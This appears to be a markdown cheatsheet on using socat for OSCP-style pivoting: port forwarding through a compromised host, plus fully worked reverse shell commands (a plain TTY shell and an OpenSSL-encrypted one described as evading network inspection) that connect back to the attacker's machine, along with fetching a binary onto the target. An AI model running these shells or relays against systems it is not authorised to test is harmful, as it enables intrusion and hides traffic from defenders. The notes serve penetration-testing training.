# Socat Cheatsheet

> Port redirection and relaying for OSCP pivoting. Socat = netcat with more power (bidirectional data channels).

---

## Conditions for Using Socat

1. **Socat must be installed on the pivot machine** — it's not always present. Check with `which socat`. If missing, you may need to transfer a static socat binary to the target.
2. **You need a shell on the pivot machine** — socat runs ON the compromised machine that bridges two networks.
3. **The pivot machine must be dual-homed** (for pivoting use) — it needs access to both your network and the target internal network. Confirm with `ip addr` and `ip route`.
4. **The listening port must be free** on the pivot machine and not blocked by a firewall.

---

## Core Concept

Socat relays traffic between two endpoints. On a pivot machine, it takes traffic hitting one port and forwards it somewhere you couldn't reach directly.

```
Kali --> Pivot Machine (socat) --> Internal Target
   reachable        bridges both        unreachable from Kali
```

---

## Port Forwarding (the main OSCP use)

**Basic port forward — relay a single port:**
```bash
socat TCP-LISTEN:<listen_port>,fork TCP:<target_ip>:<target_port>
```

Breakdown:
- `TCP-LISTEN:8080` — listen on port 8080 on the pivot
- `fork` — handle multiple connections (without this, socat dies after one)
- `TCP:10.4.187.10:80` — forward everything to this internal target

**Example — reach an internal web server through the pivot:**
```bash
# Run this ON the compromised pivot machine
socat TCP-LISTEN:8080,fork TCP:10.4.187.10:80
```
Now from Kali, browse to `http://<pivot_ip>:8080` and you reach the internal `10.4.187.10:80`.

**Example — forward to an internal SSH:**
```bash
socat TCP-LISTEN:2222,fork TCP:10.4.187.20:22
```
From Kali: `ssh user@<pivot_ip> -p 2222` connects to the internal machine's SSH.

---

## Reverse Shell Relay (through a pivot)

If an internal machine can only reach the pivot (not Kali directly), relay the reverse shell:

```bash
# On the pivot machine - relay incoming shell back to Kali
socat TCP-LISTEN:4444,fork TCP:<KALI_IP>:443
```
Internal target connects to pivot:4444, socat relays to your Kali listener on 443.

```bash
# On Kali
nc -lnvp 443
```

---

## Fully Interactive TTY Reverse Shell (better than netcat)

**On Kali (listener):**
```bash
socat file:`tty`,raw,echo=0 TCP-LISTEN:443
```

**On target:**
```bash
socat TCP:<KALI_IP>:443 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

This gives a full TTY — tab completion, Ctrl+C, working `su`/`sudo`, no "no job control" warnings. Much better than a raw netcat shell.

---

## Encrypted Reverse Shell (OPENSSL)

**Generate cert on Kali:**
```bash
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt > shell.pem
```

**On Kali (listener):**
```bash
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -
```

**On target:**
```bash
socat OPENSSL:<KALI_IP>:443,verify=0 EXEC:/bin/bash
```

Traffic is encrypted — useful against network inspection.

---

## Transferring Socat to a Target

If socat isn't installed on the pivot, transfer a static binary:

```bash
# On Kali - serve a static socat binary
python3 -m http.server 80

# On target - download it
wget http://<KALI_IP>/socat -O /tmp/socat
chmod +x /tmp/socat
/tmp/socat TCP-LISTEN:8080,fork TCP:10.4.187.10:80
```

Static socat binaries: https://github.com/andrew-d/static-binaries

---

## Quick Reference Table

| Task | Command (run on pivot) |
|------|------------------------|
| Forward a port | `socat TCP-LISTEN:8080,fork TCP:<target>:80` |
| Relay reverse shell | `socat TCP-LISTEN:4444,fork TCP:<kali>:443` |
| TTY shell (target side) | `socat TCP:<kali>:443 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane` |
| TTY shell (kali side) | `socat file:\`tty\`,raw,echo=0 TCP-LISTEN:443` |
| Encrypted listener (kali) | `socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -` |

---

## Socat vs SSH Tunneling

| | socat | SSH tunneling |
|---|-------|---------------|
| Scope | Single port relay | Multiple ports / whole subnets |
| Encryption | Optional (OPENSSL) | Built-in |
| Best for | Simple one-port pivots, TTY shells | Full network pivoting, dynamic proxying |
| Needs | socat binary on pivot | SSH access / credentials |

**Rule of thumb:** socat for quick single-port relays and stable TTY shells; SSH dynamic forwarding (or chisel/ligolo) when you need to reach a whole internal network.

---

## Key Notes

- `fork` is essential — without it socat closes after the first connection.
- Socat runs ON the pivot machine, not Kali (for forwarding use).
- Always confirm the pivot is dual-homed first: `ip addr` + `ip route`.
- If socat isn't installed and you can't transfer it, fall back to SSH tunneling.
- For reaching a whole subnet (not just one port), socat is clumsy — use SSH dynamic forwarding or chisel instead.
